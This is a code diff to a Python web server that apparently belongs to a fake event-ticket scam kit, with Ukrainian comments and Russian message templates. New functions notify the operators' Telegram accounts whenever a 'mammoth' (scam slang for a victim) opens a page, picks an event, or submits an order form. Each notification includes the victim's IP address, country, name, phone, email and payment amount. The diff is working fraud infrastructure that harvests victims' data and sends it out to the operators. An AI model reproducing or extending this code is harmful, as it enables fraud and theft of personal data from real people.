@@ -495,20 +495,176 @@ def send_button_log_to_chat(button_type, ip, page_code, user_name=None, event_in
             
             msg += f"🔗 URL: {button_url}\n"
         
-        # Надсилаємо ТІЛЬКИ в приватні повідомлення бота
+        # Надсилаємо в групу
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data_admin = {"chat_id": ADMIN_ID, "text": msg}
+        data_group = {"chat_id": GROUP_ID, "text": msg}
         
-        requests.post(url, data=data_admin, timeout=1)
-        print(f"📤 Лог про кнопку {button_type} надіслано в приватні повідомлення")
-        
-        # НЕ надсилаємо в чат - тільки в приватні повідомлення
-        # data_chat = {"chat_id": GROUP_ID, "text": msg}
-        # requests.post(url, data=data_chat, timeout=1)
-        # print(f"📤 Лог про кнопку {button_type} також надіслано в чат")
-        
+        try:
+            requests.post(url, data=data_group, timeout=2)
+            print(f"✅ Лог про кнопку {button_type} надіслано в групу")
+        except Exception as e:
+            print(f"❌ Помилка надсилання логу про кнопку в групу: {e}")
+            
     except Exception as e:
-        print(f"❌ Помилка надсилання логу про кнопку: {e}")
+        print(f"❌ Помилка в send_button_log_to_chat: {e}")
+
+def send_personal_log_to_admin(page_code, ip, country, page_name, action_type="page_view"):
+    """
+    Надсилає лог в особисті повідомлення з ботом адміну
+    """
+    try:
+        # Отримуємо admin_id за page_code
+        db = sqlite3.connect('users.db')
+        cur = db.cursor()
+        
+        # Спочатку шукаємо в event_links
+        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = cur.fetchone()
+        
+        if not row:
+            # Якщо не знайдено в event_links, шукаємо в site_users
+            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
+            row = cur.fetchone()
+        
+        db.close()
+        
+        if row:
+            admin_id = row[0]
+            
+            # Визначаємо назву події
+            event_name = get_event_name_from_page_code(f"?page={page_code}")
+            
+            # Формуємо повідомлення в потрібному форматі
+            message = f"""🔔Мамонт открыл страницу ({event_name})
+
+📎Страница: {page_name}
+#️⃣Ссылка: ?page={page_code}
+📶IP: {ip}
+🌎Страна: {country}"""
+            
+            # Надсилаємо повідомлення через Telegram API
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            data = {"chat_id": admin_id, "text": message}
+            
+            try:
+                response = requests.post(url, data=data, timeout=2)
+                if response.status_code == 200:
+                    print(f"✅ Персональний лог надіслано адміну {admin_id}")
+                else:
+                    print(f"⚠️ Помилка надсилання персонального логу: {response.status_code}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання персонального логу адміну {admin_id}: {e}")
+        else:
+            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
+            
+    except Exception as e:
+        print(f"❌ Помилка в send_personal_log_to_admin: {e}")
+
+def send_event_selection_log(page_code, ip, country, event_name, event_index):
+    """
+    Надсилає лог про вибір івенту в особисті повідомлення з ботом адміну
+    """
+    try:
+        # Отримуємо admin_id за page_code
+        db = sqlite3.connect('users.db')
+        cur = db.cursor()
+        
+        # Спочатку шукаємо в event_links
+        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = cur.fetchone()
+        
+        if not row:
+            # Якщо не знайдено в event_links, шукаємо в site_users
+            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
+            row = cur.fetchone()
+        
+        db.close()
+        
+        if row:
+            admin_id = row[0]
+            
+            # Формуємо повідомлення про вибір івенту
+            message = f"""🔔Мамонт выбрал событие ({event_name})
+
+📎Страница: Выбор события
+#️⃣Ссылка: ?page={page_code}
+📶IP: {ip}
+🌎Страна: {country}
+🎫Событие: {event_name} (№{event_index + 1})"""
+            
+            # Надсилаємо повідомлення через Telegram API
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            data = {"chat_id": admin_id, "text": message}
+            
+            try:
+                response = requests.post(url, data=data, timeout=2)
+                if response.status_code == 200:
+                    print(f"✅ Лог про вибір івенту надіслано адміну {admin_id}")
+                else:
+                    print(f"⚠️ Помилка надсилання логу про вибір івенту: {response.status_code}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання логу про вибір івенту адміну {admin_id}: {e}")
+        else:
+            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
+            
+    except Exception as e:
+        print(f"❌ Помилка в send_event_selection_log: {e}")
+
+def send_order_form_log(page_code, ip, country, name, phone, email, price, currency):
+    """
+    Надсилає лог про заповнення форми замовлення в особисті повідомлення з ботом адміну
+    """
+    try:
+        # Отримуємо admin_id за page_code
+        db = sqlite3.connect('users.db')
+        cur = db.cursor()
+        
+        # Спочатку шукаємо в event_links
+        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = cur.fetchone()
+        
+        if not row:
+            # Якщо не знайдено в event_links, шукаємо в site_users
+            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
+            row = cur.fetchone()
+        
+        db.close()
+        
+        if row:
+            admin_id = row[0]
+            
+            # Визначаємо назву події
+            event_name = get_event_name_from_page_code(f"?page={page_code}")
+            
+            # Формуємо повідомлення про форму замовлення
+            message = f"""🔔Мамонт заполнил форму заказа ({event_name})
+
+📎Страница: Оформление заказа
+#️⃣Ссылка: ?page={page_code}
+📶IP: {ip}
+🌎Страна: {country}
+👤Имя: {name or 'Не указано'}
+📱Телефон: {phone or 'Не указано'}
+📧Email: {email or 'Не указано'}
+💰Сумма: {price or 'Не указано'}{currency or ''}"""
+            
+            # Надсилаємо повідомлення через Telegram API
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            data = {"chat_id": admin_id, "text": message}
+            
+            try:
+                response = requests.post(url, data=data, timeout=2)
+                if response.status_code == 200:
+                    print(f"✅ Лог про форму замовлення надіслано адміну {admin_id}")
+                else:
+                    print(f"⚠️ Помилка надсилання логу про форму замовлення: {response.status_code}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання логу про форму замовлення адміну {admin_id}: {e}")
+        else:
+            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
+            
+    except Exception as e:
+        print(f"❌ Помилка в send_order_form_log: {e}")
 
 def get_real_ip(handler):
     xff = handler.headers.get('X-Forwarded-For')
@@ -707,7 +863,11 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             # Отримуємо країну за IP
             country = get_country_by_ip(ip)
             print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
-            # Non-blocking log
+            
+            # Надсилаємо персональний лог в особисті повідомлення з ботом
+            send_personal_log_to_admin(page_code, ip, country, get_page_name(norm_path))
+            
+            # Також надсилаємо звичайний лог (для сумісності)
             send_telegram_log_async(
                 page=norm_path,
                 link=self.path,
